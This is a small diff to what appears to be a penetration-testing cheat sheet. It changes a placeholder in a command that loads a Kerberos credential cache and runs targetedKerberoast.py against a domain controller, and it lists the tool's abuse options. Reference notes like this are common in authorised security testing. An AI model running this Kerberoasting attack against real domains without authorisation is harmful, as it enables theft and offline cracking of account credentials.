@@ -38,7 +38,7 @@ https://github.com/ShutdownRepo/targetedKerberoast
 --only-abuse  Ignore accounts that have an SPN
 --no-abuse    Don't attempt targeted Kerberoasting
 ```
-export KRB5CCNAME=<ticket>
+export KRB5CCNAME=<ccache>
 targetedKerberoast.py -v -d <domain> -k --no-pass --dc-ip <dc_ip>
 ```
 
